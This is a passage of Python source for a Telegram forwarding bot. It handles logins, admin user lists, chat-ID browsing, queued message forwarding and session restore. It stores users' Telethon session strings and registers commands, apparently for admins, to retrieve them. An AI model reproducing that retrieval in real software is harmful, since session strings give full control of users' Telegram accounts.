    user = await db_call(db.get_user, user_id)
    if not user or not user["is_logged_in"]:
        await message.reply_text(
            "❌ **You're not connected!**\n\n" "Use /login to connect your account.", parse_mode="Markdown"
        )
        return

    logout_states[user_id] = {"phone": user["phone"]}

    await message.reply_text(
        "⚠️ **Confirm Logout**\n\n"
        f"📱 **Enter your phone number to confirm disconnection:**\n\n"
        f"Your connected phone: `{user['phone']}`\n\n"
        "Type your phone number exactly to confirm logout.",
        parse_mode="Markdown",
    )


async def handle_logout_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id

    if user_id not in logout_states:
        return False

    text = update.message.text.strip()
    stored_phone = logout_states[user_id]["phone"]

    if text != stored_phone:
        await update.message.reply_text(
            "❌ **Phone number doesn't match!**\n\n"
            f"Expected: `{stored_phone}`\n"
            f"You entered: `{text}`\n\n"
            "Please try again or use /start to cancel.",
            parse_mode="Markdown",
        )
        return True

    if user_id in user_clients:
        client = user_clients[user_id]
        try:
            handler = handler_registered.get(user_id)
            if handler:
                try:
                    client.remove_event_handler(handler)
                except Exception:
                    logger.exception("Error removing event handler during logout for user %s", user_id)
                handler_registered.pop(user_id, None)

            await client.disconnect()
        except Exception:
            logger.exception("Error disconnecting client for user %s", user_id)
        finally:
            user_clients.pop(user_id, None)

    try:
        await db_call(db.save_user, user_id, None, None, None, False)
    except Exception:
        logger.exception("Error saving user logout state for %s", user_id)
    
    # Remove from session strings dictionary
    user_session_strings.pop(user_id, None)
    phone_verification_states.pop(user_id, None)
    tasks_cache.pop(user_id, None)
    target_entity_cache.pop(user_id, None)
    user_send_semaphores.pop(user_id, None)
    user_rate_limiters.pop(user_id, None)
    logout_states.pop(user_id, None)

    await update.message.reply_text(
        "👋 **Account disconnected successfully!**\n\n"
        "✅ All your forwarding tasks have been stopped.\n"
        "🔄 Use /login to connect again.",
        parse_mode="Markdown",
    )
    return True


async def getallid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not await check_authorization(update, context):
        return

    # Check if user needs to provide phone number
    if await check_phone_number_required(user_id):
        await ask_for_phone_number(user_id, update.message.chat.id, context)
        return

    user = await db_call(db.get_user, user_id)
    if not user or not user["is_logged_in"]:
        await update.message.reply_text("❌ **You need to connect your account first!**\n\n" "Use /login to connect.", parse_mode="Markdown")
        return

    await update.message.reply_text("🔄 **Fetching your chats...**")

    await show_chat_categories(user_id, update.message.chat.id, None, context)


# ---------- Admin commands ----------
async def adduser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin-only: add a user (optionally as admin)."""
    user_id = update.effective_user.id

    if not await check_authorization(update, context):
        return

    is_admin_caller = await db_call(db.is_user_admin, user_id)
    if not is_admin_caller:
        await update.message.reply_text("❌ **Admin Only**\n\nThis command is only available to admins.", parse_mode="Markdown")
        return

    text = update.message.text.strip()
    parts = text.split()

    if len(parts) < 2:
        await update.message.reply_text(
            "❌ **Invalid format!**\n\n"
            "**Usage:**\n"
            "/adduser [USER_ID] - Add regular user\n"
            "/adduser [USER_ID] admin - Add admin user",
            parse_mode="Markdown",
        )
        return

    try:
        new_user_id = int(parts[1])
        is_admin = len(parts) > 2 and parts[2].lower() == "admin"

        added = await db_call(db.add_allowed_user, new_user_id, None, is_admin, user_id)
        if added:
            role = "👑 Admin" if is_admin else "👤 User"
            await update.message.reply_text(
                f"✅ **User added!**\n\nID: `{new_user_id}`\nRole: {role}",
                parse_mode="Markdown",
            )
            try:
                await context.bot.send_message(new_user_id, "✅ You have been added. Send /start to begin.", parse_mode="Markdown")
            except Exception:
                logger.exception("Could not notify new allowed user %s", new_user_id)
        else:
            await update.message.reply_text(f"❌ **User `{new_user_id}` already exists!**", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ **Invalid user ID!**\n\nUser ID must be a number.", parse_mode="Markdown")


async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin-only: remove a user and stop their forwarding permanently in this process."""
    user_id = update.effective_user.id

    if not await check_authorization(update, context):
        return

    is_admin_caller = await db_call(db.is_user_admin, user_id)
    if not is_admin_caller:
        await update.message.reply_text("❌ **Admin Only**\n\nThis command is only available to admins.", parse_mode="Markdown")
        return

    text = update.message.text.strip()
    parts = text.split()

    if len(parts) < 2:
        await update.message.reply_text("❌ **Invalid format!**\n\n**Usage:** `/removeuser [USER_ID]`", parse_mode="Markdown")
        return

    try:
        remove_user_id = int(parts[1])

        removed = await db_call(db.remove_allowed_user, remove_user_id)
        if removed:
            if remove_user_id in user_clients:
                try:
                    client = user_clients[remove_user_id]
                    handler = handler_registered.get(remove_user_id)
                    if handler:
                        try:
                            client.remove_event_handler(handler)
                        except Exception:
                            logger.exception("Error removing event handler for removed user %s", remove_user_id)
                        handler_registered.pop(remove_user_id, None)

                    await client.disconnect()
                except Exception:
                    logger.exception("Error disconnecting client for removed user %s", remove_user_id)
                finally:
                    user_clients.pop(remove_user_id, None)

            try:
                await db_call(db.save_user, remove_user_id, None, None, None, False)
            except Exception:
                logger.exception("Error saving user logged_out state for %s", remove_user_id)

            # Remove from session strings
            user_session_strings.pop(remove_user_id, None)
            phone_verification_states.pop(remove_user_id, None)
            tasks_cache.pop(remove_user_id, None)
            target_entity_cache.pop(remove_user_id, None)
            handler_registered.pop(remove_user_id, None)
            user_send_semaphores.pop(remove_user_id, None)
            user_rate_limiters.pop(remove_user_id, None)

            await update.message.reply_text(f"✅ **User `{remove_user_id}` removed!**", parse_mode="Markdown")

            try:
                await context.bot.send_message(remove_user_id, "❌ You have been removed. Contact the owner to regain access.", parse_mode="Markdown")
            except Exception:
                logger.exception("Could not notify removed user %s", remove_user_id)
        else:
            await update.message.reply_text(f"❌ **User `{remove_user_id}` not found!**", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ **Invalid user ID!**\n\nUser ID must be a number.", parse_mode="Markdown")


async def listusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin-only: list allowed users."""
    user_id = update.effective_user.id

    if not await check_authorization(update, context):
        return

    is_admin_caller = await db_call(db.is_user_admin, user_id)
    if not is_admin_caller:
        await update.message.reply_text("❌ **Admin Only**\n\nThis command is only available to admins.", parse_mode="Markdown")
        return

    users = await db_call(db.get_all_allowed_users)

    if not users:
        await update.message.reply_text("📋 **No Allowed Users**\n\nThe allowed users list is empty.", parse_mode="Markdown")
        return

    user_list = "👥 **Allowed Users**\n\n"
    user_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

    for i, user in enumerate(users, 1):
        role_emoji = "👑" if user["is_admin"] else "👤"
        role_text = "Admin" if user["is_admin"] else "User"
        username = user["username"] if user["username"] else "Unknown"

        user_list += f"{i}. {role_emoji} **{role_text}**\n"
        user_list += f"   ID: `{user['user_id']}`\n"
        if user["username"]:
            user_list += f"   Username: {username}\n"
        user_list += "\n"

    user_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    user_list += f"Total: **{len(users)} user(s)**"

    await update.message.reply_text(user_list, parse_mode="Markdown")


# ---------- Chat listing functions ----------
async def show_chat_categories(user_id: int, chat_id: int, message_id: int, context: ContextTypes.DEFAULT_TYPE):
    if user_id not in user_clients:
        return

    message_text = (
        "🗂️ **Chat ID Categories**\n\n"
        "📋 Choose which type of chat IDs you want to see:\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🤖 **Bots** - Bot accounts\n"
        "📢 **Channels** - Broadcast channels\n"
        "👥 **Groups** - Group chats\n"
        "👤 **Private** - Private conversations\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "💡 Select a category below:"
    )

    keyboard = [
        [InlineKeyboardButton("🤖 Bots", callback_data="chatids_bots_0"), InlineKeyboardButton("📢 Channels", callback_data="chatids_channels_0")],
        [InlineKeyboardButton("👥 Groups", callback_data="chatids_groups_0"), InlineKeyboardButton("👤 Private", callback_data="chatids_private_0")],
    ]

    if message_id:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id=chat_id, text=message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def show_categorized_chats(user_id: int, chat_id: int, message_id: int, category: str, page: int, context: ContextTypes.DEFAULT_TYPE):
    from telethon.tl.types import User, Channel, Chat

    if user_id not in user_clients:
        return

    client = user_clients[user_id]

    categorized_dialogs = []
    async for dialog in client.iter_dialogs():
        entity = dialog.entity

        if category == "bots":
            if isinstance(entity, User) and entity.bot:
                categorized_dialogs.append(dialog)
        elif category == "channels":
            if isinstance(entity, Channel) and getattr(entity, "broadcast", False):
                categorized_dialogs.append(dialog)
        elif category == "groups":
            if isinstance(entity, (Channel, Chat)) and not (isinstance(entity, Channel) and getattr(entity, "broadcast", False)):
                categorized_dialogs.append(dialog)
        elif category == "private":
            if isinstance(entity, User) and not entity.bot:
                categorized_dialogs.append(dialog)

    PAGE_SIZE = 10
    total_pages = max(1, (len(categorized_dialogs) + PAGE_SIZE - 1) // PAGE_SIZE)
    start = page * PAGE_SIZE
    end = start + PAGE_SIZE
    page_dialogs = categorized_dialogs[start:end]

    category_emoji = {"bots": "🤖", "channels": "📢", "groups": "👥", "private": "👤"}
    category_name = {"bots": "Bots", "channels": "Channels", "groups": "Groups", "private": "Private Chats"}

    emoji = category_emoji.get(category, "💬")
    name = category_name.get(category, "Chats")

    if not categorized_dialogs:
        chat_list = f"{emoji} **{name}**\n\n"
        chat_list += f"📭 **No {name.lower()} found!**\n\n"
        chat_list += "Try another category."
    else:
        chat_list = f"{emoji} **{name}** (Page {page + 1}/{total_pages})\n\n"
        chat_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        for i, dialog in enumerate(page_dialogs, start + 1):
            chat_name = dialog.name[:30] if dialog.name else "Unknown"
            chat_list += f"{i}. **{chat_name}**\n"
            chat_list += f"   🆔 `{dialog.id}`\n\n"

        chat_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        chat_list += f"📊 Total: {len(categorized_dialogs)} {name.lower()}\n"
        chat_list += "💡 Tap to copy the ID!"

    keyboard = []

    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"chatids_{category}_{page - 1}"))
    if page < total_pages - 1:
        nav_row.append(InlineKeyboardButton("Next ➡️", callback_data=f"chatids_{category}_{page + 1}"))

    if nav_row:
        keyboard.append(nav_row)

    keyboard.append([InlineKeyboardButton("🔙 Back to Categories", callback_data="chatids_back")])

    await context.bot.edit_message_text(chat_list, chat_id=chat_id, message_id=message_id, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


# ---------- OPTIMIZED Forwarding core ----------
def ensure_handler_registered_for_user(user_id: int, client: TelegramClient):
    """Attach a NewMessage handler once per client/user to avoid duplicates."""
    if handler_registered.get(user_id):
        return

    async def _hot_message_handler(event):
        try:
            await optimized_gc()
            
            # Check if this is a message edit
            is_edit = isinstance(event, events.MessageEdited)
            
            message = getattr(event, "message", None)
            if not message:
                return
                
            message_text = getattr(event, "raw_text", None) or getattr(message, "message", None)
            if not message_text:
                return

            chat_id = getattr(event, "chat_id", None) or getattr(message, "chat_id", None)
            if chat_id is None:
                return

            user_tasks = tasks_cache.get(user_id)
            if not user_tasks:
                return

            message_outgoing = getattr(message, "out", False)
            
            for task in user_tasks:
                if not task.get("filters", {}).get("control", True):
                    continue
                    
                if message_outgoing and not task.get("filters", {}).get("outgoing", True):
                    continue
                    
                if chat_id in task.get("source_ids", []):
                    forward_tag = task.get("filters", {}).get("forward_tag", False)
                    filtered_messages = apply_filters(message_text, task.get("filters", {}))
                    
                    for filtered_msg in filtered_messages:
                        for target_id in task.get("target_ids", []):
                            try:
                                global send_queue
                                if send_queue is None:
                                    logger.debug("Send queue not initialized; dropping forward job")
                                    continue
                                    
                                # Put minimal job info into queue; actual send-run will handle rate-limiting and concurrency.
                                await send_queue.put((user_id, target_id, filtered_msg, task.get("filters", {}), forward_tag, chat_id if forward_tag else None, message.id if forward_tag else None))
                            except asyncio.QueueFull:
                                logger.warning("Send queue full, dropping forward job for user=%s target=%s", user_id, target_id)
        except Exception:
            logger.exception("Error in hot message handler for user %s", user_id)

    try:
        # Register handler for both new messages and message edits
        client.add_event_handler(_hot_message_handler, events.NewMessage())
        client.add_event_handler(_hot_message_handler, events.MessageEdited())
        handler_registered[user_id] = _hot_message_handler
        logger.info("Registered NewMessage and MessageEdited handler for user %s", user_id)
    except Exception:
        logger.exception("Failed to add event handler for user %s", user_id)


async def resolve_target_entity_once(user_id: int, client: TelegramClient, target_id: int) -> Optional[object]:
    """Try to resolve a target entity and cache it."""
    # Check bounded cache first
    ent = _get_cached_target(user_id, target_id)
    if ent:
        return ent

    try:
        entity = await client.get_input_entity(int(target_id))
        _set_cached_target(user_id, target_id, entity)
        return entity
    except Exception:
        logger.debug("Could not resolve target %s for user %s now", target_id, user_id)
        return None


async def resolve_targets_for_user(user_id: int, target_ids: List[int]):
    """Background resolver that attempts to resolve targets for a user."""
    client = user_clients.get(user_id)
    if not client:
        return
    for tid in target_ids:
        for attempt in range(3):
            ent = await resolve_target_entity_once(user_id, client, tid)
            if ent:
                logger.info("Resolved target %s for user %s", tid, user_id)
                break
            await asyncio.sleep(TARGET_RESOLVE_RETRY_SECONDS)


async def send_worker_loop(worker_id: int):
    """Worker that consumes send_queue and performs client.send_message with backoff."""
    logger.info("Send worker %d started", worker_id)
    global send_queue
    if send_queue is None:
        logger.error("send_worker_loop started before send_queue initialized")
        return

    while True:
        try:
            job = await send_queue.get()
        except asyncio.CancelledError:
            break
        except Exception:
            logger.exception("Error getting item from send_queue in worker %d", worker_id)
            await asyncio.sleep(0.5)
            continue

        try:
            # Unpack job
            try:
                user_id, target_id, message_text, task_filters, forward_tag, source_chat_id, message_id = job
            except Exception:
                logger.warning("Malformed job in send_queue; skipping")
                continue

            client = user_clients.get(user_id)
            if not client:
                # user isn't currently connected; skip
                logger.debug("Skipping send: client not connected for user %s", user_id)
                continue

            # ensure concurrency and rate-limit per user
            _ensure_user_send_semaphore(user_id)
            await _consume_token(user_id, 1.0)  # wait for token to be available
            sem = user_send_semaphores[user_id]

            async with sem:
                try:
                    entity = None
                    ent = _get_cached_target(user_id, target_id)
                    if ent:
                        entity = ent
                    else:
                        entity = await resolve_target_entity_once(user_id, client, target_id)

                    if not entity:
                        logger.debug("Skipping send: target %s unresolved for user %s", target_id, user_id)
                        continue

                    try:
                        if forward_tag and source_chat_id and message_id:
                            try:
                                source_entity = await client.get_input_entity(int(source_chat_id))
                                await client.forward_messages(entity, message_id, source_entity)
                                logger.debug("Forwarded message with tag for user %s to %s", user_id, target_id)
                            except Exception as e:
                                logger.warning("Failed to forward with tag, falling back to regular send: %s", e)
                                await client.send_message(entity, message_text)
                        else:
                            await client.send_message(entity, message_text)
                            logger.debug("Forwarded message without tag for user %s to %s", user_id, target_id)
                            
                    except FloodWaitError as fwe:
                        wait = int(getattr(fwe, "seconds", 10))
                        logger.warning("FloodWait for %s seconds. Re-enqueueing job and sleeping worker %d", wait, worker_id)
                        # Re-enqueue with a delay using a background task so we don't block worker loop too long
                        async def _requeue_later(delay, job_item):
                            try:
                                await asyncio.sleep(delay)
                                try:
                                    await send_queue.put(job_item)
                                except asyncio.QueueFull:
                                    logger.warning("Send queue full while re-enqueueing after FloodWait; dropping message.")
                            except Exception:
                                logger.exception("Error in delayed requeue")
                        asyncio.create_task(_requeue_later(wait + 1, job))
                    except Exception as e:
                        logger.exception("Error sending message for user %s to %s: %s", user_id, target_id, e)

                except Exception:
                    logger.exception("Unexpected error in per-send block for worker %d", worker_id)

        except Exception:
            logger.exception("Unexpected error in send worker %d", worker_id)
        finally:
            try:
                send_queue.task_done()
            except Exception:
                pass


async def start_send_workers():
    global _send_workers_started, send_queue, worker_tasks
    if _send_workers_started:
        return

    if send_queue is None:
        send_queue = asyncio.Queue(maxsize=SEND_QUEUE_MAXSIZE)

    for i in range(SEND_WORKER_COUNT):
        t = asyncio.create_task(send_worker_loop(i + 1))
        worker_tasks.append(t)

    _send_workers_started = True
    logger.info("Spawned %d send workers", SEND_WORKER_COUNT)


async def start_forwarding_for_user(user_id: int):
    """Ensure client exists, register handler (once), and ensure caches created."""
    if user_id not in user_clients:
        return

    client = user_clients[user_id]
    tasks_cache.setdefault(user_id, [])
    _ensure_user_target_cache(user_id)
    _ensure_user_send_semaphore(user_id)
    _ensure_user_rate_limiter(user_id)

    ensure_handler_registered_for_user(user_id, client)


# ---------- Session restore ----------
async def restore_sessions():
    logger.info("🔄 Restoring sessions...")

    # First, load sessions from environment variable
    for user_id, session_string in USER_SESSIONS.items():
        if len(user_clients) >= MAX_CONCURRENT_USERS:
            logger.warning(f"Max concurrent users reached, skipping user {user_id} from env")
            continue
            
        try:
            await restore_single_session(user_id, session_string, from_env=True)
        except Exception as e:
            logger.exception(f"Failed to restore session from env for user {user_id}: {e}")

    # Then, restore from database (these will override env sessions if same user)
    try:
        # Fetch at most MAX_CONCURRENT_USERS sessions to restore at startup to avoid OOM
        users = await asyncio.to_thread(lambda: db.get_logged_in_users(MAX_CONCURRENT_USERS * 2))
    except Exception:
        logger.exception("Error fetching logged-in users from DB")
        users = []

    try:
        all_active = await db_call(db.get_all_active_tasks)
    except Exception:
        logger.exception("Error fetching active tasks from DB")
        all_active = []

    tasks_cache.clear()
    for t in all_active:
        uid = t["user_id"]
        tasks_cache.setdefault(uid, [])
        tasks_cache[uid].append({
            "id": t["id"], 
            "label": t["label"], 
            "source_ids": t["source_ids"], 
            "target_ids": t["target_ids"], 
            "is_active": 1,
            "filters": t.get("filters", {})
        })

    logger.info("📊 Scheduled restore for %d logged in user(s) from DB", len(users))

    # Restore in small batches to reduce parallel connection spikes
    batch_size = 3
    restore_tasks = []
    for row in users:
        try:
            user_id = row.get("user_id") if isinstance(row, dict) else row[0]
            session_data = row.get("session_data") if isinstance(row, dict) else row[1]
        except Exception:
            try:
                user_id, session_data = row[0], row[1]
            except Exception:
                continue

        if session_data:
            # Skip if already restored from env
            if user_id in user_clients:
                logger.info(f"User {user_id} already restored from env, skipping DB restore")
                continue
                
            restore_tasks.append(restore_single_session(user_id, session_data, from_env=False))

        # If we have batch_size tasks, run them concurrently
        if len(restore_tasks) >= batch_size:
            await asyncio.gather(*restore_tasks, return_exceptions=True)
            restore_tasks = []
            await asyncio.sleep(1)
    if restore_tasks:
        await asyncio.gather(*restore_tasks, return_exceptions=True)


async def restore_single_session(user_id: int, session_data: str, from_env: bool = False):
    """Restore a single user session with error handling"""
    try:
        client = TelegramClient(StringSession(session_data), API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            # If we're already at capacity, skip restoring this session (it remains persisted in DB)
            if len(user_clients) >= MAX_CONCURRENT_USERS:
                logger.info("Skipping restore for user %s due to capacity limits", user_id)
                try:
                    await client.disconnect()
                except Exception:
                    pass
                if not from_env:
                    await db_call(db.save_user, user_id, None, None, None, True)  # keep logged flag
                return

            user_clients[user_id] = client
            user_session_strings[user_id] = session_data  # Store session string
            
            # Get user info from client
            try:
                me = await client.get_me()
                user_name = me.first_name or "User"
                
                # Check if user has phone in database
                user = await db_call(db.get_user, user_id)
                has_phone = user and user.get("phone")
                
                # Update database with session and name
                await db_call(db.save_user, user_id, 
                            user["phone"] if user else None,  # Keep existing phone if any
                            user_name, 
                            session_data, 
                            True)
                
                target_entity_cache.setdefault(user_id, OrderedDict())
                _ensure_user_send_semaphore(user_id)
                _ensure_user_rate_limiter(user_id)
                user_tasks = tasks_cache.get(user_id, [])
                all_targets = []
                for tt in user_tasks:
                    all_targets.extend(tt.get("target_ids", []))
                if all_targets:
                    try:
                        asyncio.create_task(resolve_targets_for_user(user_id, list(set(all_targets))))
                    except Exception:
                        logger.exception("Failed to schedule resolve_targets_for_user on restore for %s", user_id)
                await start_forwarding_for_user(user_id)
                
                source = "environment variable" if from_env else "database"
                logger.info("✅ Restored session for user %s from %s (Phone: %s)", 
                          user_id, source, "Yes" if has_phone else "No")
                
            except Exception as e:
                logger.warning(f"Could not get user info for {user_id}: {e}")
                # Still restore session without user info
                target_entity_cache.setdefault(user_id, OrderedDict())
                _ensure_user_send_semaphore(user_id)
                _ensure_user_rate_limiter(user_id)
                await start_forwarding_for_user(user_id)
                logger.info("✅ Restored session for user %s (limited info)", user_id)
        else:
            if not from_env:
                await db_call(db.save_user, user_id, None, None, None, False)
            logger.warning("⚠️ Session expired for user %s", user_id)
    except Exception as e:
        logger.exception("❌ Failed to restore session for user %s: %s", user_id, e)
        if not from_env:
            try:
                # Leave DB logged-in flag as-is (so user can be restored later), but mark session invalid if needed
                await db_call(db.save_user, user_id, None, None, None, False)
            except Exception:
                logger.exception("Error marking user logged out after failed restore for %s", user_id)


# ---------- Graceful shutdown cleanup ----------
async def shutdown_cleanup():
    """Disconnect Telethon clients and cancel worker tasks cleanly."""
    logger.info("Shutdown cleanup: cancelling worker tasks and disconnecting clients...")

    # Cancel our worker tasks
    for t in list(worker_tasks):
        try:
            t.cancel()
        except Exception:
            logger.exception("Error cancelling worker task")
    if worker_tasks:
        try:
            await asyncio.gather(*worker_tasks, return_exceptions=True)
        except Exception:
            logger.exception("Error while awaiting worker task cancellations")

    # Attempt to disconnect Telethon clients in a best-effort way
    user_ids = list(user_clients.keys())
    batch_size = 5
    for i in range(0, len(user_ids), batch_size):
        batch = user_ids[i:i + batch_size]
        disconnect_tasks = []
        for uid in batch:
            client = user_clients.get(uid)
            if not client:
                continue

            # Remove registered handler if any
            handler = handler_registered.get(uid)
            if handler:
                try:
                    client.remove_event_handler(handler)
                except Exception:
                    logger.exception("Error removing event handler during shutdown for user %s", uid)
                handler_registered.pop(uid, None)

            try:
                disconnect_tasks.append(client.disconnect())
            except Exception:
                # Fallback synchronous close of session object if present
                try:
                    sess = getattr(client, "session", None)
                    if sess is not None:
                        try:
                            sess.close()
                        except Exception:
                            logger.exception("Failed to close client.session for user %s", uid)
                except Exception:
                    logger.exception("Failed fallback client close for user %s", uid)

        if disconnect_tasks:
            try:
                await asyncio.gather(*disconnect_tasks, return_exceptions=True)
            except Exception:
                logger.exception("Error while awaiting client disconnects for a batch")

    # Clear runtime caches
    user_clients.clear()
    user_session_strings.clear()
    phone_verification_states.clear()
    target_entity_cache.clear()
    user_send_semaphores.clear()
    user_rate_limiters.clear()

    try:
        db.close_connection()
    except Exception:
        logger.exception("Error closing DB connection during shutdown")

    logger.info("Shutdown cleanup complete.")


# ---------- Application post_init ----------
async def post_init(application: Application):
    global MAIN_LOOP
    MAIN_LOOP = asyncio.get_running_loop()

    logger.info("🔧 Initializing bot...")

    await application.bot.delete_webhook(drop_pending_updates=True)
    logger.info("🧹 Cleared webhooks")

    # Register signals so we run cleanup while loop is still running
    def _signal_handler(sig_num, frame):
        logger.info("Signal %s received, scheduling shutdown...", sig_num)
        try:
            if MAIN_LOOP is not None and getattr(MAIN_LOOP, "is_running", lambda: False)():
                # Schedule shutdown on MAIN_LOOP
                future = asyncio.run_coroutine_threadsafe(_graceful_shutdown(application), MAIN_LOOP)
                try:
                    future.result(timeout=30)
                except Exception:
                    logger.exception("Graceful shutdown timed out or failed")
            else:
                logger.warning("Main loop not available when signal received")
        except Exception:
            logger.exception("Error in signal handler")

    # Attach handlers for common termination signals
    try:
        signal.signal(signal.SIGINT, _signal_handler)
        signal.signal(signal.SIGTERM, _signal_handler)
    except Exception:
        logger.exception("Failed to register signal handlers; platform may not support them")

    if OWNER_IDS:
        for oid in OWNER_IDS:
            try:
                is_admin = await db_call(db.is_user_admin, oid)
                if not is_admin:
                    await db_call(db.add_allowed_user, oid, None, True, None)
                    logger.info("✅ Added owner/admin from env: %s", oid)
            except Exception:
                logger.exception("Error adding owner/admin %s from env", oid)

    if ALLOWED_USERS:
        for au in ALLOWED_USERS:
            try:
                await db_call(db.add_allowed_user, au, None, False, None)
                logger.info("✅ Added allowed user from env: %s", au)
            except Exception:
                logger.exception("Error adding allowed user %s from env: %s", au)

    await start_send_workers()
    await restore_sessions()

    async def _collect_metrics():
        try:
            q = None
            try:
                q = send_queue.qsize() if send_queue is not None else None
            except Exception:
                q = None
            return {
                "send_queue_size": q,
                "worker_count": len(worker_tasks),
                "active_user_clients_count": len(user_clients),
                "user_session_strings_count": len(user_session_strings),
                "phone_verification_states_count": len(phone_verification_states),
                "tasks_cache_counts": {uid: len(tasks_cache.get(uid, [])) for uid in list(tasks_cache.keys())},
                "memory_usage_mb": _get_memory_usage_mb(),
            }
        except Exception as e:
            return {"error": f"failed to collect metrics in loop: {e}"}

    def _forward_metrics():
        global MAIN_LOOP
        if MAIN_LOOP is not None:
            try:
                future = asyncio.run_coroutine_threadsafe(_collect_metrics(), MAIN_LOOP)
                return future.result(timeout=1.0)
            except Exception as e:
                logger.exception("Failed to collect metrics from main loop")
                return {"error": f"failed to collect metrics: {e}"}
        else:
            return {"error": "bot main loop not available"}

    try:
        register_monitoring(_forward_metrics)
    except Exception:
        logger.exception("Failed to register monitoring callback with webserver")

    logger.info("✅ Bot initialized!")


async def _graceful_shutdown(application: Application):
    """Run shutdown_cleanup and stop the application, executed on MAIN_LOOP."""
    try:
        await shutdown_cleanup()
    except Exception:
        logger.exception("Error during graceful shutdown_cleanup")
    try:
        # Attempt to stop the PTB application gracefully
        try:
            await application.stop()
        except Exception:
            logger.exception("Error stopping Application during graceful shutdown")
    except Exception:
        logger.exception("Error scheduling application stop during graceful shutdown")


def _get_memory_usage_mb():
    """Get current memory usage in MB"""
    try:
        import psutil
        process = psutil.Process()
        return round(process.memory_info().rss / 1024 / 1024, 2)
    except ImportError:
        return None


# ---------- Main -----------
def main():
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not found")
        return

    if not API_ID or not API_HASH:
        logger.error("❌ API_ID or API_HASH not found")
        return

    logger.info("🤖 Starting Forwarder Bot...")
    logger.info(f"📊 Loaded {len(USER_SESSIONS)} string sessions from environment variable")

    start_server_thread()

    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # Register all command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("login", login_command))
    application.add_handler(CommandHandler("logout", logout_command))
    application.add_handler(CommandHandler("forwadd", forwadd_command))
    application.add_handler(CommandHandler("fortasks", fortasks_command))
    application.add_handler(CommandHandler("getallid", getallid_command))
    application.add_handler(CommandHandler("adduser", adduser_command))
    application.add_handler(CommandHandler("removeuser", removeuser_command))
    application.add_handler(CommandHandler("listusers", listusers_command))
    application.add_handler(CommandHandler("getallstring", getallstring_command))
    application.add_handler(CommandHandler("getuserstring", getuserstring_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_text_messages))

    logger.info("✅ Bot ready!")
    try:
        application.run_polling(drop_pending_updates=True)
    finally:
        # Fallback cleanup if shutdown did not run via signals
        try:
            # Prefer MAIN_LOOP if it's running
            loop_to_use = None
            try:
                if MAIN_LOOP is not None and getattr(MAIN_LOOP, "is_running", lambda: False)():
                    loop_to_use = MAIN_LOOP
                else:
                    try:
                        running_loop = asyncio.get_running_loop()
                        if getattr(running_loop, "is_running", lambda: False)():
                            loop_to_use = running_loop
                    except RuntimeError:
                        loop_to_use = None
            except Exception:
                loop_to_use = None

            if loop_to_use:
                try:
                    future = asyncio.run_coroutine_threadsafe(shutdown_cleanup(), loop_to_use)
                    future.result(timeout=30)
                except Exception:
                    logger.exception("Error waiting for fallback shutdown_cleanup scheduled on running loop")
            else:
                # create temporary loop and run cleanup
                tmp_loop = asyncio.new_event_loop()
                try:
                    asyncio.set_event_loop(tmp_loop)
                    tmp_loop.run_until_complete(shutdown_cleanup())
                finally:
                    try:
                        tmp_loop.close()
                    except Exception:
                        pass
                    try:
                        asyncio.set_event_loop(None)
                    except Exception:
                        pass
        except Exception:
            logger.exception("Error during fallback shutdown cleanup")


if __name__ == "__main__":
    main()
